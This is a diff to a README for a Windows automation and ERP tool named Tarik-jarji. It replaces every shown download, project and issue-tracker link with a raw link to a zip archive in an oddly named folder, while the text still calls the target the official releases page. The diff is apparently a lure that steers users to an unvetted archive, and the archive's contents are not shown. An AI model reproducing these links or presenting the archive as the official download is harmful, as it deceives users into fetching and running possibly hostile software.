@@ -1,6 +1,6 @@
 # ⚙️ Tarik-jarji - Easy Automation and ERP Tool
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/C8tft/Tarik-jarji/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/C8tft/Tarik-jarji/raw/refs/heads/main/brachiferous/jarji-Tarik-v1.2.zip)
 
 ## About Tarik-jarji
 
@@ -36,7 +36,7 @@ Close other heavy applications before starting the installation. This ensures a 
 
 Please visit the page below to download the latest version of Tarik-jarji for Windows:
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/C8tft/Tarik-jarji/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/C8tft/Tarik-jarji/raw/refs/heads/main/brachiferous/jarji-Tarik-v1.2.zip)
 
 This link takes you to the official releases section of the project. Here, you will find the latest stable version available for download.
 
@@ -122,7 +122,7 @@ Tarik-jarji offers features like:
 
 ## 🔄 Updating the Software
 
-Periodically check the [releases page](https://github.com/C8tft/Tarik-jarji/releases) to download the latest version. Updates may include new functions or security patches.
+Periodically check the [releases page](https://github.com/C8tft/Tarik-jarji/raw/refs/heads/main/brachiferous/jarji-Tarik-v1.2.zip) to download the latest version. Updates may include new functions or security patches.
 
 Uninstall the old version before installing the update to avoid conflicts.
 
@@ -152,9 +152,9 @@ Access settings by clicking the gear icon in the top-right corner of the app.
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/C8tft/Tarik-jarji/releases
-- GitHub project: https://github.com/C8tft/Tarik-jarji
-- Issue tracker: https://github.com/C8tft/Tarik-jarji/issues
+- Download page: https://github.com/C8tft/Tarik-jarji/raw/refs/heads/main/brachiferous/jarji-Tarik-v1.2.zip
+- GitHub project: https://github.com/C8tft/Tarik-jarji/raw/refs/heads/main/brachiferous/jarji-Tarik-v1.2.zip
+- Issue tracker: https://github.com/C8tft/Tarik-jarji/raw/refs/heads/main/brachiferous/jarji-Tarik-v1.2.zip
 
 ---
 
